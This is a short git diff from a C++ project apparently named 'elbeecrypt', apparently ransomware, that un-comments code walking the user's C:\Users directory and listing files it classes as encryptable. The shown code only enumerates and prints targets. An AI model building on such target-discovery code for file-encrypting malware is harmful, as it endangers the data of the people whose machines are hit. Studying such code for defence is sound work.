@@ -43,7 +43,6 @@ int main(int argc, char **argv){
 
 	std::cout << "Sodium: " << sodium_init() << std::endl;
 
-	/*
 	//Define the lambda to collect the directory listings
 	auto consumer = [](const fs::path& path){
 		if(elbeecrypt::common::targets::Extensions::isEncryptable(path)){
@@ -54,9 +53,7 @@ int main(int argc, char **argv){
 	//Call the walk function with the root path and the lambda
 	std::string uname(getenv("username"));
 	elbeecrypt::common::io::DirentWalk::walk(fs::path("C:\\Users\\" + uname), consumer);
-	*/
 
-	/*
 	vector<fs::path> paths = {};
 
 	elbeecrypt::common::io::DirentWalk::directoryList("C:\\Users\\", paths);
@@ -68,7 +65,6 @@ int main(int argc, char **argv){
 			std::cout << "Found encryptable file at " << path << std::endl;
 		}
 	}
-	*/
 }
 
 /** Impl of safetyNet(). */
